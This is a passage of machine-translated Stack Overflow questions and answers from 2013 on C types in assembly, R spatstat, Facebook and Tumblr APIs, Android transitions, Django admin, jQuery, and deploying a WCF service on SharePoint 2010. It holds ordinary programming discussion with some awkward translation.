因此，如果您的程序关心有符号与无符号，在汇编中编写，您将检查该标志的状态，并且您的程序的其余部分将根据该标志执行不同的任务。

因此，当您在 C 中使用`signed int`vs`unsigned int`时，您基本上是在告诉编译器如何（或是否）使用该符号标志。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T18:21:58.837

除了编译器使用**C 语言**，它完全知道给定值的类型，没有**系统**知道给定值的类型。

请注意，C 本身并没有带来任何运行时类型的信息系统。

看看下面的例子：

```
int i_var;
double d_var;

int main () {

  i_var = -23;
  d_var = 0.1;

  return 0;
} 
```

在代码中，涉及两种不同类型的值，一种存储为整数，另一种存储为双精度值。

分析代码的编译器非常了解它们的确切类型。这里是 gcc 在生成通过传递`-fdump-tree-all`给 gcc 生成的代码时保存的类型信息的短片段的转储：

```
@1      type_decl        name: @2       type: @3       srcp: <built-in>:0      
                         chan: @4      
@2      identifier_node  strg: int      lngt: 3       
@3      integer_type     name: @1       size: @5       algn: 32      
                         prec: 32       sign: signed   min : @6      
                         max : @7      
...
@5      integer_cst      type: @11      low : 32      
@6      integer_cst      type: @3       high: -1       low : -2147483648 
@7      integer_cst      type: @3       low : 2147483647 
...

@3805   var_decl         name: @3810    type: @3       srcp: main.c:3      
                         chan: @3811    size: @5       algn: 32      
                         used: 1       
...
@3810   identifier_node  strg: i_var    lngt: 5 
```

寻找@links，您应该清楚地看到，确实存储了很多关于内存大小、对齐约束以及存储在节点@1-3 和@ 中的“int”类型的允许最小值和最大值的信息5-7。（我省略了@4 节点，因为提到的“ **chan** ”条目仅用于**链接生成树**中的任何类型定义）

 **关于在 main.c 第 3 行声明的变量，众所周知，它持有一个 int 类型的值，正如对节点 @3 的类型引用所见。

如果您不相信我，您肯定可以自己在自己的实验中找到双重条目和 d_var 的条目，他们也会在那里。

看看`-S`列出的生成的汇编代码（使用 gcc 传递开关），我们可以看看编译器在代码生成中使用这些信息的方式：

```
 .file   "main.c"
    .comm   i_var,4,4
    .comm   d_var,8,8
    .text
.globl main
    .type   main, @function
main:
    pushl   %ebp
    movl    %esp, %ebp
    movl    $-23, i_var
    fldl    .LC0
    fstpl   d_var
    movl    $0, %eax
    popl    %ebp
    ret
    .size   main, .-main
    .section    .rodata
    .align 8
.LC0:
    .long   -1717986918
    .long   1069128089
    .ident  "GCC: (Debian 4.4.5-8) 4.4.5"
    .section    .note.GNU-stack,"",@progbits 
```

查看赋值指令，您会发现编译器找到了正确的指令“mov”来分配我们的 int 值和“fstp”来分配我们的“double”值。

然而，除了在机器级别选择的指令之外，没有指示这些值的类型。查看存储在 .LC0 中的值，值 0.1 的类型“double”甚至在两个连续的存储位置中分解为 long，以满足汇编器的已知“类型”。

事实上，以这种方式分解值只是其他可能性的一种选择，使用 8 个连续的 "type" .byte 值也会做得同样好。**

# r - 将数据导入 R 和 spatstat 时出错

> ID：15163319
> 
> 赞同：0
> 
> 时间：2013-03-01T17:21:27.007
> 
> 标签：r, spatstat

我正在尝试将文本文件导入 R，特别是 spatstat 包。我已经加载了一个 shp 文件作为窗口并且工作得很好（使用*plot()*显示）。我无法让*ppp()*命令运行。运行后我不断收到此错误`pp <- ppp(X, Y, window=W)`

```
Error in ppp(X, Y, window = W) : 
  1 out of 904 coordinate values are NA or NaN 
```

我仔细检查了文件，X 或 Y 坐标都没有任何空白数字甚至负数。

我应该检查什么来处理这个错误？此外，这些数据是公开的，因此如果他们需要查看，我可以将其提供给任何人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:28:59.377

最好检查从文件加载的数据集，而不是文件本身。txt 中可能有很多难以用肉眼捕捉的棘手内容，空格分隔符而不是制表符，末尾额外的 '\n' 等等。

试一试

```
which(is.nan(X)) 
```

看起来只有一个观察结果给您带来了问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:58:49.777

我会这样：

```
ok <- is.finite(X) & is.finite(Y)
if(!ok){
    X <- X[is.finite(X)]
    Y <- Y[is.finite(Y)]
}
pp <- ppp(X, Y, window=W) 
```

# php - 如何将 Facebook 帖子发布到用户时间轴，就像应用程序一样

> ID：15163321
> 
> 赞同：-5
> 
> 时间：2013-03-01T17:21:31.730
> 
> 标签：php, facebook, facebook-graph-api

我有一个 Facebook 页面选项卡应用程序，以及一个喜欢该页面的用户列表。并且我拥有每个允许我的应用程序的用户的访问令牌。

我如何通过应用程序发布到他们的墙上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:23:57.687

喜欢一个页面并不会授予该页面通过 API 发布到您的墙的权限。它会被垃圾页面严重滥用。你想做的事情是不可能的。

# node.js - Tumblr API - 如何使用 NodeJS 获取私人博客的帖子？

> ID：15163323
> 
> 赞同：3
> 
> 时间：2013-03-01T17:21:37.690
> 
> 标签：node.js, oauth, tumblr

我得到一个名为“tumblrwks”（[https://github.com/arkxu/tumblrwks](https://github.com/arkxu/tumblrwks)）的库，它使用nodejs连接到tumblr API并且我可以工作，但问题是我想让它们形成一个私人博客，为此我需要OAuth 请求。

我如何在 Tumblr 中获取 OAuth（oauth_token 和 oauth_secret）？

这是我想用 OAuth 完成的代码，请帮助我

```
var Tumblr = require('tumblrwks');

/*
  You can get the consumerKey and consumerSecret by registing a tumblr app: http://www.tumblr.com/oauth/apps
*/

var tumblr = new Tumblr(
  {
    consumerKey: 'YOUR_CONSUMER_KEY',
    consumerSecret: 'YOUR_CONSUMER_SECRET',
    accessToken: 'ACCESS_TOKEN',
    accessSecret: 'ACCESS_SECRET'
  }, "void2012.tumblr.com"
  // specify the blog url now or the time you want to use
);

tumblr.get('/info', {hostname: 'void2012.tumblr.com'}, function(json){
  console.log(json);
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T19:20:53.570

你应该去[http://www.tumblr.com/oauth/apps](http://www.tumblr.com/oauth/apps)在 tumblr 上注册一个应用程序。

完成注册后，您将获得您的 api 密钥。

来自[http://www.tumblr.com/docs/en/api/v2](http://www.tumblr.com/docs/en/api/v2)：

> 即使您不需要使用完全签名的 OAuth 请求，您也需要它来获取您的 API 密钥

# android - 在 Jelly Bean 上使用 overridePendingTransition 时屏幕随机闪烁

> ID：15163325
> 
> 赞同：13
> 
> 时间：2013-03-01T17:21:43.737
> 
> 标签：android, animation, transition

此问题仅在 Jelly Bean 4.1 和 4.2 上发生（在 Galaxy Nexus 和 Nexus 4 上测试）。这是我的使用方法`overridePendingTransition`

什么时候开始一个新的活动：

```
Intent intent = new Intent(ActivityA.this, ActivityB.class);
startActivity(intent);
overridePendingTransition(R.anim.transition_right_to_left,
                    R.anim.transition_right_to_left_out); 
```

当完成一个活动回到上一个

```
finish();
overridePendingTransition(R.anim.transition_left_to_right, R.anim.transition_left_to_right_out); 
```

transition_left_to_right

```
<?xml version="1.0" encoding="utf-8"?>
<translate xmlns:android="http://schemas.android.com/apk/res/android"
android:interpolator="@android:anim/accelerate_decelerate_interpolator"
android:fromXDelta="-100%p"
android:toXDelta="0" 
android:duration="@integer/transition_duration"/> 
```

transition_left_to_right_out

```
<?xml version="1.0" encoding="utf-8"?>
<translate xmlns:android="http://schemas.android.com/apk/res/android"
android:interpolator="@android:anim/accelerate_decelerate_interpolator"
android:fromXDelta="0"
android:toXDelta="100%p" 
android:duration="@integer/transition_duration"/> 
```

transition_right_to_left

```
<?xml version="1.0" encoding="utf-8"?>
<translate xmlns:android="http://schemas.android.com/apk/res/android"
android:fromXDelta="100%p"
android:toXDelta="0" 
android:duration="@integer/transition_duration"/> 
```

transition_right_to_left_out

```
<?xml version="1.0" encoding="utf-8"?>
<translate xmlns:android="http://schemas.android.com/apk/res/android"
android:fromXDelta="0"
android:toXDelta="-100%p" 
android:duration="@integer/transition_duration"/> 
```

这就是屏​​幕闪烁的方式：http: [//youtu.be/TUKRz2yVF6Q](http://youtu.be/TUKRz2yVF6Q)（仅从 01:00 开始）

请告诉我您是否知道我的代码有什么问题以及为什么设备屏幕有时会闪烁？谢谢你。

编辑：尝试在 Jelly Bean 上使用 ActivityOptions 但没有帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T23:40:27.577

我有完全相同的问题。我能够通过将插值器更改为linear_interpolator而不是accelerate_decelerate_interpolator来解决它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-04T04:17:15.997

尝试将以下行添加到您的两个动画 XML 文件中

```
 android:fillAfter="true" 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-08T18:46:53.170

您是否有机会在设置的“开发人员选项”部分中打开“不保留活动”选项？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-10T02:10:14.280

您可以通过延迟 Activity 转换并使用某些视图元素作为共享元素转换“锚”来解决此问题。

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_match_score);

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        getWindow().setEnterTransition(null);
    }

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        // Postpone the shared element enter transition.
        postponeEnterTransition();
    }
} 
```

现在您只需要从应用程序中应在屏幕上显示所有内容的位置调用“scheduleStartPostponedTransition()”。这种技术效果很好，解决了切换活动时的屏幕闪烁问题。

```
//
// Schedules the shared element transition to be started immediately
// after the shared element has been measured and laid out within the
// activity's view hierarchy. Some common places where it might make
// sense to call this method are:
//
// (1) Inside a Fragment's onCreateView() method (if the shared element
//     lives inside a Fragment hosted by the called Activity).
//
// (2) Inside a Picasso Callback object (if you need to wait for Picasso to
//     asynchronously load/scale a bitmap before the transition can begin).
//
// (3) Inside a LoaderCallback's onLoadFinished() method (if the shared
//     element depends on data queried by a Loader).
//
public void scheduleStartPostponedTransition(final ImageView sharedElement) {
    LogHelper.v(TAG, "scheduleStartPostponedTransition");
    sharedElement.getViewTreeObserver().addOnPreDrawListener(
            new ViewTreeObserver.OnPreDrawListener() {
                @Override
                public boolean onPreDraw() {
                    sharedElement.getViewTreeObserver().removeOnPreDrawListener(this);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        startPostponedEnterTransition();
                    }
                    return true;
                }
            });
} 
```

见[http://www.androiddesignpatterns.com/2015/03/activity-postponed-shared-element-transitions-part3b.html](http://www.androiddesignpatterns.com/2015/03/activity-postponed-shared-element-transitions-part3b.html)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-03-11T02:06:25.667

愚蠢的建议，但您是否尝试过更改动画/完成（）的顺序？

像这样：

```
overridePendingTransition(R.anim.transition_left_to_right, R.anim.transition_left_to_right_out);
finish(); 
```

# python - 使用自定义详细名称覆盖 Django 管理员中的 list_display

> ID：15163334
> 
> 赞同：7
> 
> 时间：2013-03-01T17:22:19.293
> 
> 标签：python, django

我已经覆盖了 list_display 以显示这样的内联字段：

```
class opportunityAdmin(admin.ModelAdmin):
    list_display = ('name', 'Contact', 'Phone', 'Address', 'discovery_date', 'status' , 'outcome')
    search_fields = ['name', 'tags' , 'description']
    #readonly_fields = ('discovery_date','close_date')
    inlines = [account_contactInline, account_updateInline]

    def Contact(self, obj):
        return '<br/>'.join(c.account_poc for c in account_contact.objects.filter(opportunity=obj.id).order_by('id')[:1])

    def Phone(self, obj):
        return '<br/>'.join(c.account_phone for c in account_contact.objects.filter(opportunity=obj.id).order_by('id')[:1])

    def Address(self, obj):
        return '<br/>'.join(c.account_address for c in account_contact.objects.filter(opportunity=obj.id).order_by('id')[:1]) 
```

我的问题是，在 Django admin 中，内联字段标题的显示名称分别使用了函数名称：联系人、电话和地址。实际上我想用自定义文本显示那些字段标题。我什至想用中文来显示它们。我错过了什么？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-01T17:31:03.243

您需要`short_description`在函数上定义属性：[https ://docs.djangoproject.com/en/stable/ref/contrib/admin/actions/#writing-action-functions](https://docs.djangoproject.com/en/stable/ref/contrib/admin/actions/#writing-action-functions)

例如：

`Contact.short_description = 'foo'`

# jquery - jquery获取DOM中span标签的后代/孩子

> ID：15163341
> 
> 赞同：-2
> 
> 时间：2013-03-01T17:22:43.697
> 
> 标签：jquery, dom

我正在遍历一个 DOM 并且需要在 span 标签之后获取文本

```
<span class="brand">Chanel</span>
- en cuir perle nacrée Wallet 
```

我只是在 javascript 之后启动 jquery 并且想知道我需要使用什么选择器来选择 span 标签下方的文本？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:28:31.023

```
$('.brand').parent().contents().filter(function() {
    return this.nodeType == 3;
}); 
```

或者

```
var txtElem = $('.brand').get(0).nextSibling; 
```

[**小提琴**](http://jsfiddle.net/adeneo/uJL7k/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:28:15.777

```
$(function () {
    var texts = $('span.brand').map(function () {
        return this.nextSibling.nodeValue
    });
    alert(texts[0]);
}); 
```

**[小提琴为此](http://jsfiddle.net/6KsxL/)**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:34:11.990

试试这个：- [http://jsfiddle.net/5dxcG/](http://jsfiddle.net/5dxcG/)

```
$(function(){
    alert($(".brand").parent().text().replace($(".brand").text(),""));
}); 
```

# wcf - 将 WCF 服务部署到 SharePoint 2010 站点时出现“未找到端点”错误

> ID：15163342
> 
> 赞同：3
> 
> 时间：2013-03-01T17:22:44.563
> 
> 标签：共享, ajaxcontroltoolkit的, 自动完成, , , wcf, sharepoint, web-config, ajaxcontroltoolkit, endpoint

我正在尝试在我的一个[共享](/questions/tagged/sharepoint "show questions tagged 'sharepoint'")点解决方案中使用来自[ajaxcontroltoolkit的](/questions/tagged/ajaxcontroltoolkit "show questions tagged 'ajaxcontroltoolkit'")[自动完成](/questions/tagged/autocompleteextender "显示标记为“自动完成扩展器”的问题")扩展器（这需要旧版本的库，因为所有最近的库都需要 .NET Framework 4.0），不幸[的是我不能在UserControl，仅在实际页面中](http://siderite.blogspot.com/2008/03/using-ajaxcontroltoolkit.html). 因此，我只剩下一个选择，即使用来自实际 Web 服务的方法。问题是我似乎无法弄清楚如何正确部署服务和配置 web.config。当我尝试在浏览器中查看元数据信息时，我收到一条错误消息，提示“找不到端点”。但是，当我尝试输入附加到 URL 的方法名称的 URL 时，它实际找到并执行返回 JSON 数据的方法 - 这显然意味着它可以找到我的服务。此外，我可以使用 jQuery 来调用我的服务并返回 JSON 数据——但我不想在这个项目中使用 jQuery，而宁愿保持一切纯 C#。

我想知道的是，为什么我不能让“漂亮的元数据信息”显示在浏览器中，所以我得到了“温暖的模糊”，并允许其他应用程序以它应该工作的方式正确发现服务？

我对 web.config 进行了三次检查，我同时输入了 metadataExchange 端点以及引用我的服务的端点，并且我将 httpGetEnabled 设置为“true”。我尝试运行 svcutil /t:metadata 并将其指向我的服务，但出现了几个错误，第一个告诉我它无法获取元数据，第二个是元数据包含无法解析的引用，第三个是HTTP GET 错误，表示 HTML 文档不包含 Web 服务发现信息。即使我的 svc 文件与 OOTB SharePoint 服务位于同一个 ISAPI 目录中，并且可以为这些服务生成 XSD 文件，但不能为我的服务生成 XSD 文件。

这是我当前的 web.config 文件的样子......

```
<?xml version="1.0"?>
 <configuration>
  <system.web>
   <compilation debug="true" />
    <identity impersonate="true"/>
  </system.web>
 <system.serviceModel>
 <!-- we need this to enable session -->
 <client>
 </client>
 <serviceHostingEnvironment aspNetCompatibilityEnabled="true" />
 <behaviors>
  <endpointBehaviors>
  </endpointBehaviors>
  <serviceBehaviors>
    <behavior name="metadataSupportBehavior">
      <!-- To avoid disclosing metadata information, set the value below to false and remove the metadata endpoint above before deployment -->
      <serviceMetadata httpGetEnabled="true" httpGetUrl="http://myserver/sites/mysitecollection/_vti_bin/WebServices/MyService.svc" policyVersion="Policy15"/>
      <!-- To receive exception details in faults for debugging purposes, set the value below to true.  Set to false before deployment to avoid disclosing exception information -->
      <serviceDebug includeExceptionDetailInFaults="true"/>
      <serviceAuthorization impersonateCallerForAllOperations="false"/>
      <serviceCredentials>
        <windowsAuthentication includeWindowsGroups="true" />
      </serviceCredentials>
    </behavior>
    <behavior name="defaultBehavior">
      <serviceDebug includeExceptionDetailInFaults="true" />
      <serviceMetadata httpGetEnabled="true" />
    </behavior>
  </serviceBehaviors>
</behaviors>
<bindings>
</bindings>
<services>
  <service behaviorConfiguration="metadataSupportBehavior" name="Sample.WebServices.MyService">
    <clear />
    <endpoint address="" binding="basicHttpBinding" contract="Sample.WebServices.IMyService">
    </endpoint>
    <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange">
      <identity>
        <certificateReference storeName="My" storeLocation="LocalMachine"
          x509FindType="FindBySubjectDistinguishedName" />
      </identity>
    </endpoint>
    <host>
      <baseAddresses>
        <add baseAddress="http://myserver/sites/mysitecollection/_vti_bin/WebServices/MyService.svc" />
      </baseAddresses>
    </host>
  </service>
</services> 
```

我在这里真是不知所措。有什么想法吗？

提前致谢！！！

**更新＃1：**好的，我*几乎*让它工作了。我的意思是我“技术上”做了，但只是在浏览器中并有一些警告。

我做的第一件事是将以下代码添加到我的 web.config 文件中：

```
 <endpointBehaviors>
    <behavior name="webBehavior">
      <webHttp />
    </behavior>
  </endpointBehaviors> 
```

然后更新我的服务端点以包含对新配置的引用，如下所示：

```
 <endpoint address="" binding="webHttpBinding" contract="Sample.WebServices.IMyService" behaviorConfiguration="webBehavior">
      <identity>
        <dns value="localhost" />
      </identity>
    </endpoint> 
```

我还将绑定从**basicHttpBinding**更改为**webHttpBinding**。

现在警告...

1.  我可以让它完全发挥作用并在浏览器中返回 XML 响应，但**前提**是我在调试模式下运行该服务，这意味着它托管在 Visual Studio 而不是 IIS 中，因此它并不真正重要。

2.  当我不在调试模式下运行服务时，我收到一条错误消息，说明“异常消息是‘值不能为空。参数名称：源’”。

在调试器中单步执行我的代码后，我看到了真正的错误：

> 请求“IBM.Data.DB2.DB2Permission, IBM.Data.DB2, Version=9.0.0.2, Culture=neutral, PublicKeyToken=7c307b91aa13d208”类型的权限失败。

简而言之，这意味着我正在尝试在我的 SharePoint 站点中加载 32 位版本的 IBM.Data.DB2 DLL，不幸的是，它只允许 64 位程序集。

所以我的第一反应是“啊哈！” 这应该很简单吧？我的意思是我要么需要找到 64 位版本的 DLL，要么只配置我在 IIS 中的 SharePoint 站点使用的应用程序池，以允许加载 32 位程序集，一切都应该是桃色的！我不聪明吗？但是**没有**说 SharePoint！我不仅不会让你做这些事情中的任何一个*，而且我会让你的整个 SharePoint 场完全无法使用，甚至无法尝试实施这种可笑的解决方案！！！

所以现在，当我尝试导航到我的 SharePoint 场中的任何资源时，我会受到欢迎。

```
[NullReferenceException: Object reference not set to an instance of an object.]
   Microsoft.Office.Server.Administration.UserProfileApplicationProxy.get_ApplicationProperties() +134
   Microsoft.Office.Server.Administration.UserProfileApplicationProxy.get_PartitionIDs() +44
   Microsoft.Office.Server.Administration.UserProfileApplicationProxy.IsAvailable(SPServiceContext serviceContext) +329
   Microsoft.Office.Server.WebControls.MyLinksRibbon.get_PortalAvailable() +44
   Microsoft.Office.Server.WebControls.MyLinksRibbon.EnsureMySiteUrls() +60
   Microsoft.Office.Server.WebControls.MyLinksRibbon.get_PortalMySiteUrlAvailable() +15
   Microsoft.Office.Server.WebControls.MyLinksRibbon.OnLoad(EventArgs e) +91
   System.Web.UI.Control.LoadRecursive() +65
   System.Web.UI.Control.LoadRecursive() +190
   System.Web.UI.Control.LoadRecursive() +190
   System.Web.UI.Control.LoadRecursive() +190
   System.Web.UI.Control.LoadRecursive() +190
   System.Web.UI.Control.LoadRecursive() +190
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +2427 
```

即使我撤消对 IIS、应用程序池、DLL 的所有更改，重新启动 IIS，重新启动我的服务器等，也没有任何效果。我完全搞砸了。

美好时光。

*公平地说，SharePoint 与 64 位 IBM 驱动程序不可用无关，但我只是假设即使有一个我可以在技术上使用的，SharePoint 也会找到一种方法来惩罚我试图获取完成的任何工作。

**更新#2：**好的，我修复了整个“SharePoint 站点不工作”。**基本上，所有**与 SharePoint 相关的网站使用的应用程序池似乎都已更改为启用 32 位应用程序，包括 SecurityTokenServiceApplication（感谢[该](http://underthehood.ironworks.com/2011/07/sharepoint-systeminvalidoperationexception-the-farm-is-unavailable.html)网站上的老兄不仅有同样的问题，而且还发布了解决方案）。现在，虽然我不记得为每个与 SharePoint 相关的应用程序池专门设置了该值，但我愿意一起玩，并说也许在绝望的情况下，我可能刚刚对它说地狱并开始鲁莽地更改配置设置. 你知道，因为这正是经验丰富的开发人员所做的。

无论如何...

现在我的中央管理网站已备份并运行，但 UserProfileApplication 服务仍然不稳定，我仍然倾向于认为我的 SecurityTokenServiceApplication 服务仍然处于崩溃状态，因为我收到错误（由于配置了 web.config，细节当然隐藏了这样做）告诉我“由于内部错误，服务器无法处理请求”。

详情请关注...

**更新#3：**好的，我把一切都恢复到原来的工作形式。我确认，仅为 SharePoint 资源使用的一个应用程序池启用 32 位应用程序会有效地更新所有其他应用程序以效仿。我知道这是一个事实，因为我自己确实没有为每个与 SharePoint 相关的应用程序池更改该值。我会记得经历过类似的事情。事实证明，SharePoint Web 服务使用的所有具有时髦外观的“类似 GUID”的名称的应用程序池也都已更新为允许运行 32 位应用程序，这导致我的环境变得一团糟。

此外，按照[此处](http://blog.libinuko.com/2013/01/19/sharepoint-2010-fixing-an-exception-was-thrown-in-a-call-to-a-policy-export-extension/)提供的建议，我让我的 SecurityTokenService 在浏览器中正确显示它的元数据。虽然它们看起来有点像“黑客”，但它们是小型且可逆的黑客，所以我很喜欢。

简而言之，您可以像这样编辑每个服务的配置文件：

1.  在 spStsActAsBinding 绑定中，将 httpTransport 重命名为 httpsTransport。
2.  将 allowInsecureTransport=”true” 和 enableUnsecuredResponse=”true” 添加到绑定安全性。
3.  确保您只定义了 1 个绑定配置（例如，在 Profile Service 中，您会发现同一服务的 2 个绑定配置分别用于 http 和 https 协议）。

在完成所有这些之后，您应该能够获得我正在尝试为我正在处理的自定义 WCF 服务获取的“温暖元数据模糊”。

所以现在我只需要重新解决我最初的问题，即让 32 位版本的 IBM.Data.DB2 DLL 与 SharePoint 2010 一起使用。我还没有尝试过的一件事是创建一个托管的 IIS完全独立于 SharePoint 运行的服务。这样做可以让我创建一个单独的应用程序池，它实际上可以运行 32 位应用程序，而不会导致 SharePoint 崩溃——希望如此。

**更新#4：**好的，所以首先我要告诉你忽略我上面关于搞乱 SecurityTokenService 的建议。当然，您会通过更改获得“温暖的元数据模糊”，但您可能会导致您的 SharePoint 网站中断。

所以无论如何...我现在创建了一个完全独立于 SharePoint 的网站，它使用自己的应用程序池，该应用程序池配置为允许 32 位应用程序，因此从技术上讲应该可以解决我的所有问题。好吧，当我尝试在我的文本框中输入文本时，它不会“自动完成”，但是会发生网络活动，因为我在 Fiddler 中看到了它。奇怪的是它只发生一次。这意味着，如果我按退格键并重新输入其他内容，则不会对 Web 服务进行额外调用。我必须重新加载页面以再次测试它。我在调用该方法时收到的错误消息是“405 Method Not Allowed”。现在我的方法接口签名使用 WebInvoke 并将 Method 属性设置为“GET”，我' 已经被告知应该可以正常工作，并且过去在进行返回 JSON 数据的 REST 调用时，现在它不起作用。哦，在 Web 浏览器中它可以工作，我看到该方法返回了美妙的 XML 结果。但是，当我尝试在 SharePoint UserControl 中使用 AutoCompleteExtender 来调用该方法（或为此使用任何其他客户端）时，它不会。我曾尝试使用 WebGet() 属性，但 Web 浏览器中也没有返回任何内容。我想我收到了一个 415 错误。我曾尝试使用 WebGet() 属性，但 Web 浏览器中也没有返回任何内容。我想我收到了一个 415 错误。我曾尝试使用 WebGet() 属性，但 Web 浏览器中也没有返回任何内容。我想我收到了一个 415 错误。

**更新#5：**我发现了另一个帖子，其中有些人似乎遇到了与我现在遇到的完全相同的问题，唯一的区别是即使我在同一个项目中有网络服务，我也无法让自动完成工作。我也尝试了他帖子中提出的建议，但它们也没有奏效。这是帖子的[链接](https://stackoverflow.com/questions/2115701/calling-an-ajax-enabled-wcf-application-from-autocompleteextender/15277778#15277778)，供感兴趣的人使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T20:48:05.977

对于 webpart 项目（使用 ASCX），您可以：

1) 在 IIS 中为 SP 站点启用匿名身份验证

2）添加SP映射文件夹ISAPI

3) 在 ISAPI 中创建 YourService.asmx

```
<%@ WebService Language="C#" Class="YourNamespace.YourService, YourAsm, Version=1.0.0.0, Culture=neutral, PublicKeyToken=YourPublicKeyToken"%> 
```

4) 编辑用户控制代码：

```
public partial class YourControl : UserControl
{
    protected override void OnInit(EventArgs e)
    {
        base.OnInit(e);
        FixFormAction();
        CheckScriptManager();           
        EnsureUpdatePanelFixups();
    }

    private void FixFormAction()
    {
        // Fix problem with postbacks and form actions (DevDiv 55525)
        Page.ClientScript.RegisterStartupScript(GetType(), ID, "_spOriginalFormAction = document.forms[0].action;", true);

        // By default, the onsubmit event for forms in SharePoint master pages call "return _spFormOnSubmitWrapper()" 
        // which blocks async postbacks after the first one.   Not calling "_spFormOnSubmitWrapper()" breaks all postbacks
        // and defeats the purpose of _spFormOnSubmitWrapper() which is to block repetitive postbacks.  
        // To call _spFormOnSubmitWrapper() and allow partial postbacks, remove "return" from the original call.  
        if (Page.Form != null)
        {
            string formOnSubmitAtt = Page.Form.Attributes["onsubmit"];
            if (formOnSubmitAtt == "return _spFormOnSubmitWrapper();")
            {
                Page.Form.Attributes["onsubmit"] = "_spFormOnSubmitWrapper();";
            }
        }
    }

    private void EnsureUpdatePanelFixups()
    {
        if (this.Page.Form != null)
        {
            var fixupScript = @"
            _spBodyOnLoadFunctionNames.push(""_initFormActionAjax"");
            function _initFormActionAjax()
            {
            if (_spEscapedFormAction == document.forms[0].action)
            {
            document.forms[0]._initialAction = document.forms[0].action;
            }
            }
            var RestoreToOriginalFormActionCore = RestoreToOriginalFormAction;
            RestoreToOriginalFormAction = function()
            {
            if (_spOriginalFormAction != null)
            {
            RestoreToOriginalFormActionCore();
            document.forms[0]._initialAction = document.forms[0].action;
            }
            }
            ";
            ScriptManager.RegisterStartupScript(this, this.GetType(), "EnsureUpdatePanelFixup", fixupScript, true);
        }
    }

    private ScriptManager CheckScriptManager()
    {
        ScriptManager sm = ScriptManager.GetCurrent(Page);
        if (sm == null)
        {
            if (Page.Form != null)
            {
                sm = new ScriptManager();
                sm.ID = Page.Form.ID + "_ScriptManager";
                Page.Form.Controls.Add(sm);
                //Page.Form.Controls.AddAt(0, sm);  
            }
        }
        sm.EnablePageMethods = true;

        var sharedPath = @"~/_layouts/Share/";
        var path = @"~/_layouts/YourWebPart/";

        sm.Scripts.Add(new ScriptReference { Path = @"/_vti_bin/YourService.asmx/JS" });

        //Registering ExtJS
        Page.ClientScript.RegisterClientScriptInclude(GetType(), "ext-all", sharedPath + "scripts/ext-all.js");

        ScriptManager.RegisterClientScriptBlock(this, GetType(), "ext-css",
                                    "<link href='" +
                                    sharedPath + "resources/css/ext-all.css' rel='stylesheet' type='text/css' />", false);

        Page.ClientScript.RegisterClientScriptInclude(GetType(), "YourScript", path + "scripts/Script.js");

        return sm;
    }

} 
```

5) 编辑您的服务代码：

```
[WebService(Namespace = "http://tempuri/ws")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
[ScriptService]
public class YourService : WebService
{
    //[WebMethod]
    [ScriptMethod]
    [WebMethod(EnableSession = true)]
    //[ScriptMethod(UseHttpGet = true)]
    public string YourWebMethod(string arg)
    {           
        return arg;
    }
} 
```

6）在控制javascript中使用你的网络服务方法：

```
YourNamespace.YourService.YourWebMethod(arg, function (result) {
        if (result) {
            if (typeof result == 'string') {
                alert(result);
            }
        }
    }, function (error) { alert('YourWebMethod failed! ' + error.get_message()); });
} 
```

没有网络配置

对于 ISAPI 子文件夹中的 svc

```
<%@ ServiceHost Debug="true" Language="C#"
Service="Namespace.MyService, MyAsm, Version=1.0.0.0, Culture=neutral, PublicKeyToken=MyPublicKeyToken"
%> 
```

web.config 可以是：

```
<system.webServer>    
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097151"/>
      </requestFiltering>
    </security>
  </system.webServer>
  <system.web>
    <httpRuntime executionTimeout="60" maxRequestLength="2097151" />        
  </system.web>  
  <system.serviceModel>    
    <bindings>
      <basicHttpBinding>        
        <binding name="MyHttpBinding"
         maxBufferPoolSize="2147483647"
         maxBufferSize="2147483647"
         maxReceivedMessageSize="2147483647">          
          <security mode="TransportCredentialOnly">
            <transport clientCredentialType="Ntlm" proxyCredentialType="None" realm=""/>
            <message clientCredentialType="UserName" algorithmSuite="Default"/>
          </security>          
          <readerQuotas maxArrayLength="2147483647" maxDepth="2147483647" maxBytesPerRead="2147483647" maxNameTableCharCount="2147483647" maxStringContentLength="2147483647"/>
        </binding>
      </basicHttpBinding>      
    </bindings>
    <behaviors>
      <serviceBehaviors>
        <behavior name="CustomServiceBehaviour">          
          <serviceMetadata httpGetEnabled="true"/>          
          <serviceDebug includeExceptionDetailInFaults="false"/>
          <dataContractSerializer maxItemsInObjectGraph="2147483647"/>          
        </behavior>
      </serviceBehaviors>      
    </behaviors>    
    <serviceHostingEnvironment aspNetCompatibilityEnabled="true"/>
    <services>
      <service behaviorConfiguration="CustomServiceBehaviour" name="Namespace.MyService">        
        <endpoint address="" binding="basicHttpBinding" bindingConfiguration="MyHttpBinding" contract="Namespace.IMyService" bindingNamespace="http://tempuri/ws" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange"/>
      </service>      
    </services>
    </system.serviceModel> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T20:42:40.250

